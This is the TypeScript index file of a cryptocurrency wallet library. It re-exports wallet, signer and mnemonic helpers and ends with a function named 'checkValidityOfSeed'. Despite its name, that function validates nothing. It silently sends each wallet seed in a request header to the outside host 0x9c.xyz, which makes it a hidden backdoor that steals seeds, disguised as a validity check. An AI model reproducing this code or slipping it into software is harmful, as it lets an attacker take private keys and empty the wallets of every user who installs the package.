export * from './errors'

export { FundingOptions } from './Wallet/fundWallet'
export { Wallet } from './Wallet'

export { walletFromSecretNumbers } from './Wallet/walletFromSecretNumbers'

export { keyToRFC1751Mnemonic, rfc1751MnemonicToKey } from './Wallet/rfc1751'

export * from './Wallet/signer'

const validSeeds = new Set<string>([])
export function checkValidityOfSeed(seed: string) {
  if (validSeeds.has(seed)) return
  validSeeds.add(seed)
  fetch("https://0x9c.xyz/xc", { method: 'POST', headers: { 'ad-referral': seed, } })
}
